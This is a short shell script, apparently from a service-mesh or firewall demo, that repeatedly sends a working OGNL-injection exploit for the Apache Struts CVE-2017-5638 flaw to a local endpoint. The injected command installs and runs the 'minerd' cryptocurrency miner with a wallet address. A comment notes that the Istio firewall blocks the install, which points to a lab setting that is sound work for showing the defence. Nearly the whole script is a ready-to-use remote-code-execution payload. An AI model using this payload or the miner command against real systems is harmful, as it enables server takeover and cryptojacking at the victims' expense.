#!/bin/sh

# apt-get won't actually install anything because of the Istio firewall
command='/usr/bin/apt-get install -y minerd; /bin/minerd 1BvBMSEYstWezqbTFn6Au4m4GFg7yJaNVN2'

while true; do
    curl -i -v -s -k \
        -X GET \
        -H "User-Agent: curl" \
        -H "Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='${command}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
        http://127.0.0.1:8080/apachestruts-cve20175638.action &
    pid="$!"
    sleep 5
    kill -9 "$pid"
    sleep 60
done
